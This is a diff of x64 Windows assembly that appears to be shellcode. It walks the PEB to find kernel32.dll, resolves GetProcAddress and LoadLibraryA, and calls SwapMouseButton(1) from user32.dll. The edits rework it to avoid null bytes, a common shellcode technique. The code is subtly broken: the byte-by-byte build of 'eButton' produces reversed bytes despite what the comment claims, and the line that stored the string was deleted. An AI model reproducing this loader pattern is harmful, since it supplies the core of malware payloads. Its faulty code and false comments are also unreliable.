@@ -7,6 +7,8 @@ _start:
 		mov rbx , rsp
 		and rsp , 0xFFFFFFFFFFFFFFF0
 		sub rsp, 0x30               ; Shadow space
+		
+		
 
 
 		;get basse address of kernel32.dll
@@ -16,19 +18,21 @@ _start:
 		mov rsi , [rsi + 0x20] ; RSI = InMemOrder
 		mov rsi , [rsi] ;traverse through modules
 		mov rsi , [rsi]
-		mov rbx , [rsi + 0x30] ; BAse Address of kernel32.dll (DllBase)
+		mov rbx , [rsi + 0x20] ; BAse Address of kernel32.dll (DllBase)
 		
-		;RBX = Base Address of kernel32.dll
+		
+		;RBX = **Base Address of kernel32.dll**
 		
 		;find the export table
 		mov edx , [rbx + 0x3c]  ;RDX = DOS -> e_elfanew RVA (DWORD)
-		add rdx , rbx ; VA of e_elfanew
-		mov edx , [rdx + 0x78] ; Export Directory RVA
-		add rdx , rbx ; VA of Export Directory
+		lea rdx , [rdx + rbx] ; VA of e_elfanew
+		mov edx , [rdx + 0x88] ; Export Directory RVA
+		lea rdx , [rdx + rbx] ; VA of Export Directory
 		mov esi , [rdx + 0x20] ; RVA of AddressofNames
-		add rsi , rbx ; VA of AddressofNames
+		lea rsi , [rsi + rbx] ; VA of AddressofNames
 		
 		;RDX = Base Address of Export Directory
+		;RSI = Addrees of Names
 		;Finding GetProcAddress function Name (just a index)
 		xor rcx , rcx
 		
@@ -37,9 +41,9 @@ _start:
 		mov eax , [rsi + rcx * 4] ;RVA of next function
 		mov rax , rax
 		add rax , rbx ; VA of next function
-
-		mov eax, dword [rax]              ; "GetP"
-		cmp eax, 0x50746547
+        xor rdi , rdi
+		mov edi, dword [rax]              ; "GetP"
+		cmp edi, 0x50746547
 		jnz Next_fun
 
 		mov eax, dword [rax + 4]          ; "rocA"
@@ -63,6 +67,7 @@ _start:
 		Found_fun:
 		
 		;RCX = index of AddressofNames[]
+		;RAX , RDI free
 		
 		
 
@@ -76,8 +81,8 @@ _start:
 		add rax , rbx
 		mov r8 , rax
 		
-		
-		
+		;RCX = free
+		;RAX = getprocaddress
 		;r8 = getprocAddress
 
 		
@@ -96,7 +101,7 @@ _start:
 		call r8 ; GetProcAddress(kernel32.dll, "LoadLibraryA")
 		mov r9 , rax ; r9 = LoadLibraryA
 		
-
+		;rax , r9 = loadlibrary
 		
 		
 		
@@ -112,14 +117,29 @@ _start:
 		call r9  ; LoadLibraryA("user32.dll")
 		mov rsi , rax  ; user32.dll base
 		
+		
+		;rax , rsi = user32.dll base
 
 		
 		
 		; build "SwapMouseButton" string
 		mov rax , 0x73756F4D70617753 ; 'SwapMous'
 		mov [rsp] , rax
-		mov rax, 0x6E6F7474754265 ; "eButton"
-		mov [rsp + 8] , rax
+		xor rax, rax        ; clear rax (null-free)
+		add al, 0x65        ; 'e'
+		shl rax, 8
+		add al, 0x42        ; 'B'
+		shl rax, 8
+		add al, 0x75        ; 'u'
+		shl rax, 8
+		add al, 0x74        ; 't'
+		shl rax, 8
+		add al, 0x74        ; 't'
+		shl rax, 8
+		add al, 0x6F        ; 'o'
+		shl rax, 8
+		add al, 0x6E        ; 'n'
+; RAX now contains: 0x6E6F7474754265 ("eButton")
 		mov byte [rsp + 16] , 0x6E ; 'n' completes "Button"
 		xor al , al
 		lea rdi , [rsp + 17]
@@ -130,7 +150,8 @@ _start:
 		
 		; --- call SwapMouseButton(1) ---
 		
-		mov rcx, 1        ; argument = 1 (swap)
+		xor rcx , rcx       ; argument = 1 (swap)
+		inc rcx
 		call rax          ; call SwapMouseButton(1)
 		
 		; --- build "ExitProcess" string ---
